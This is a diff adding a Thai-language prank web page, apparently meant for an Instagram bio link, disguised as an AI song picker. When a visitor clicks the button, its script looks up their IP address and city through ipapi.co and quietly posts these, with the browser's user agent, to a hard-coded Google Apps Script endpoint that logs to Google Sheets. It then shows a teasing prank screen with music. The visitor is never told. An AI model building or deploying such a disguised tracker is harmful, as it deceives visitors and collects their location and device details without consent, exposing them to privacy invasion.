@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Song for You 🎵</title>
+    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;500&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Kanit', sans-serif; background: linear-gradient(135deg, #fbc2eb 0%, #a6c1ee 100%); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; color: #444; }
+        .card { background: rgba(255, 255, 255, 0.9); padding: 30px; border-radius: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); width: 85%; max-width: 350px; }
+        h2 { margin-bottom: 10px; color: #6a82fb; }
+        p { font-size: 14px; margin-bottom: 20px; }
+        .btn { background: #6a82fb; color: white; border: none; padding: 12px 25px; border-radius: 50px; font-size: 16px; cursor: pointer; transition: 0.3s; width: 100%; }
+        .btn:hover { background: #fc5c7d; transform: scale(1.05); }
+        #prank-content { display: none; }
+        img { width: 100%; border-radius: 15px; margin: 15px 0; }
+        .blink { animation: blinker 1.5s linear infinite; color: red; font-weight: bold; }
+        @keyframes blinker { 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+
+    <!-- หน้าแรก: หลอกให้กด -->
+    <div class="card" id="landing-page">
+        <h2>🎵 สุ่มเพลงให้คุณ</h2>
+        <p>ให้ AI เลือกเพลงที่ตรงกับความรู้สึกคุณตอนนี้มากที่สุด...</p>
+        <button class="btn" onclick="startPrank()">กดเพื่อสุ่มเพลง</button>
+    </div>
+
+    <!-- หน้าแกล้ง: หลังจากกดแล้ว -->
+    <div class="card" id="prank-content">
+        <h1 class="blink">โป๊ะแตก! 🤣</h1>
+        <h2>"กดเข้ามาแอบชอบหรอ?"</h2>
+        <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJndnY4ZzRyeHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/3o7TKVUn7iM8FMEU24/giphy.gif">
+        <p></p>
+        <!-- ใส่ลิงก์ไฟล์เพลง .mp3 ตรงนี้ -->
+        <audio id="bgMusic" loop>
+            <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
+        </audio>
+    </div>
+
+    <script>
+        async function startPrank() {
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbzEAclBqZ-oL5PUl-qKj730FUU0LvoTkr-TCdgOcWUu1SPjJgM0uDZjobHRWvk3A95T/exec'; // <-- วาง URL จาก Google Apps Script ที่นี่
+
+            // ดึงข้อมูลเบื้องต้น (IP และ Location)
+            let ipInfo = { ip: "Checking...", city: "Unknown" };
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                ipInfo = await res.json();  
+            } catch (e) { console.log("Skip IP"); }
+
+            // ส่งข้อมูลไป Google Sheets
+            const payload = {
+                ip: ipInfo.ip,
+                city: ipInfo.city,
+                device: navigator.userAgent,
+                platform: "IG-Bio-Link"
+            };
+
+            fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(payload)
+            });
+
+            // สลับหน้าจอและเล่นเพลง
+            document.getElementById('landing-page').style.display = 'none';
+            document.getElementById('prank-content').style.display = 'block';
+            document.getElementById('bgMusic').play();
+        }
+    </script>
+</body>
+</html>
